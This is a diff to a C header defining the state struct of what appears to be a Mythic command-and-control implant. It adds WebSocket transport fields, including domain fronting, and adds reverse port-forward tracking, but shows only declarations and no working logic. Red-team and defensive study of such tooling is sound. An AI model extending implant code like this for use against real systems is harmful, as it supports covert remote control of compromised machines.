@@ -48,7 +48,7 @@ typedef struct
     PCHAR spawnto;  
     CHAR injectKitSpawn[37];               // Mythic UUIDs for BOF files
     CHAR injectKitExplicit[37];
-    PCHAR pipename;
+    //PCHAR pipename;
     // Linked Agents
     PLINKS Links;
     // Message Queue
@@ -86,6 +86,30 @@ typedef struct
 
 #endif
 
+#if defined(WEBSOCKET_TRANSPORT)
+
+    PCHAR  WsHostname;
+    UINT32 WsPort;
+    BOOL   WsIsSSL;
+    PCHAR  WsEndpoint;
+    PCHAR  WsUserAgent;
+    PCHAR  WsDomainFront;
+
+    BOOL   WsConnected;
+    HANDLE WsSession;
+    HANDLE WsConnection;
+    HANDLE WsRequest;
+    HANDLE WsHandle;
+    HANDLE WsRecvThread;
+    HANDLE WsInboundEvent;
+    HANDLE WsSendMutex;
+    HANDLE WsQueueMutex;
+    volatile BOOL WsStopRecv;
+    struct _WS_INBOUND_NODE* WsInboundHead;
+    struct _WS_INBOUND_NODE* WsInboundTail;
+
+#endif
+
 #if defined(INCLUDE_CMD_DOWNLOAD)
 
     // Download Queue
@@ -104,6 +128,14 @@ typedef struct
 
     // SOCKS Connections
     struct _SOCKS_CONN* SocksConnections;
+
+#endif
+
+#if defined(INCLUDE_CMD_RPORTFWD)
+
+    // Reverse port forward listeners and connections
+    struct _RPORTFWD_LISTENER* RportfwdListeners;
+    struct _RPORTFWD_CONN*     RportfwdConnections;
 
 #endif
 
